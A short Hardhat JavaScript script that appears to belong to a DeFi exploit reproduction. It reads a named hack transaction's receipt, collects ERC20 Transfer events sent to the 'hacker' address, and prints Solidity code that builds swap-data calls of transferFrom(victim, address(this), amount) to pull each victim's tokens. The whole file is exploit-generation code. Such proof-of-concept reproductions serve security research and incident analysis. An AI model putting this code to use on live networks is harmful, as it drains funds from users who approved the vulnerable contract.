// To run this script, remove blockNumber setting in hardhat.config.js

const ethers = hre.ethers;
const txHash = '0x4b4143cbe7f5475029cf23d6dcbb56856366d91794426f2e33819b9b1aac4e96';
const hacker = '0x878099F08131a18Fab6bB0b4Cfc6B6DAe54b177E';

async function print(index, token, victim) {
    const address = await token.address;
	const symbol = await token.symbol();
    // console.log(`${symbol}: ${address} / ${victim}`);

    console.log(`\t\t_swapData[${index}].callTo = address(${symbol});`);
    console.log(`\t\t_swapData[${index}].callData = abi.encodeWithSignature(\n\t\t\t"transferFrom(address,address,uint256)",\n\t\t\t${victim},\n\t\t\taddress(this),\n\t\t\ttransferAmount(${symbol}, ${victim})\n\t\t);\n`);
}

async function main() {
    const ERC20 = await ethers.getContractFactory("ERC20");
    const tx = await ethers.provider.getTransactionReceipt(txHash);
    const logs = tx.logs;
    let i = 1;
    for (const rawLog of logs) {
        try {
            const log = ERC20.interface.parseLog(rawLog);
        	if (log.name === 'Transfer' && log.args.to === hacker) {
            	const token = await ethers.getContractAt("ERC20", rawLog.address);
            	const victim = log.args.from;
            	await print(i, token, victim);
            	i++;
        	}
        } catch (e) { 
//        	console.log(e);
        }
    }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });